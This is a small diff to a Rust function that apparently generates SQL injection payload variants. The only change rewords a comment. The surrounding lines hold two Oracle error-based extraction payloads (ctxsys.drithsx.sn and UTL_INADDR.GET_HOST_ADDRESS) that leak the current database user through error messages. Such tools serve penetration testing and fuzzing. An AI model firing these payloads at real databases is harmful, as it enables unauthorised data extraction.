@@ -26,7 +26,7 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<String> {
 
     // ── Error-based extraction ──
     results.push("SELECT ctxsys.drithsx.sn(1,(SELECT user FROM DUAL)) FROM DUAL".into());
-    // UTL_INADDR error-based — resolves hostname, errors with data in message
+    // UTL_INADDR error-based, resolves hostname, errors with data in message
     results.push("SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM DUAL)) FROM DUAL".into());
 
     // ── CHR() concatenation (Oracle uses ||) ──
